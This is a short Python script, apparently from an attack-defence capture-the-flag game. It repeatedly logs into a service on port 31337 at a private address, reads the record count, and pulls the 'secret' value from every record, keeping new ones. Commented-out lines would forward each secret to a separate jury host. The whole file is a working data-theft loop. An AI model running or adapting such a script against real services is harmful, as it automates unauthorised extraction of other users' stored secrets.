import socket
import time
import re

j_host = '192.168.0.132'
j_port = 31337
hosts = ['192.168.0.247']
port = 31337

def send_msg(msg):
    sock.send(msg.encode('utf-8'))
    time.sleep(0.2)
    return sock.recv(1024).decode('utf-8')

def get_secret(id):
    send_msg('2')
    m = send_msg(str(id))
    n = re.findall(r'\|.+\|.+\| +(\w+) +\|', m)[-1]
    return n

def get_last():
    send_msg('3')
    send_msg('privet')
    m = send_msg('1')
    n = int(re.findall(r'\n\| +(\d+) +\|', m)[0])
    return n

sock = socket.socket()
done = set()
#j_sock = socket.socket()
#j_sock.connect((j_host, j_port))

for host in hosts:
    sock.connect((host, port))
    print(sock.recv(1024).decode('utf-8'))
    print(send_msg('2'))
    print(send_msg('user'))
    print(send_msg('passwd'))
    sock.close()
    sock = 1
    sock = socket.socket()
    time.sleep(.2)

while True:
    for host in hosts:
        sock.connect((host, port))
        print(sock.recv(1024).decode('utf-8'))
        print(send_msg('1'))
        print(send_msg('user'))
        print(send_msg('passwd'))
        n = get_last()
        for i in range(1, n+1):
            secret = get_secret(i)
            if secret not in done:
                print(secret)
                #j_sock.send(secret.encode('utf-8'))
                #print(j_sock.recv(1024).decode('utf-8'))
                done.add(secret)
        sock.close()
        sock = 1
        sock = socket.socket()
        time.sleep(5)